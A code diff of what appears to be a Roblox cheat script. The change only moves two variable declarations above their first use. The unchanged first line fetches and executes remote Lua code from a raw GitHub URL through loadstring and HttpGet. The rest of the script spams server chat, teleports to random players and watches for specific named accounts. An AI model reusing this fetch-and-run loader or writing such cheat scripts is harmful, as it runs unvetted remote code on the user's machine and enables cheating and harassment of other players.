@@ -1,4 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/loaderthing/main/jk"))()
+local playerList = game.Players:GetPlayers()
+local specialPlayersInServer = {}
 local function Chat(message)
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
 end
@@ -11,18 +13,6 @@ local function TeleportToRandomPlayer(playerList)
 end
 
 local specialPlayers = {"Ripend", "SZCVAK", "Di33l2", "altsarecooleh"}
-
-for _, playerName in ipairs(specialPlayers) do
-    for _, player in ipairs(playerList) do
-        if player.Name == playerName then
-            table.insert(specialPlayersInServer, player)
-            break
-        end
-    end
-end
-
-local playerList = game.Players:GetPlayers()
-local specialPlayersInServer = {}
 
 for _, playerName in ipairs(specialPlayers) do
     for _, player in ipairs(playerList) do
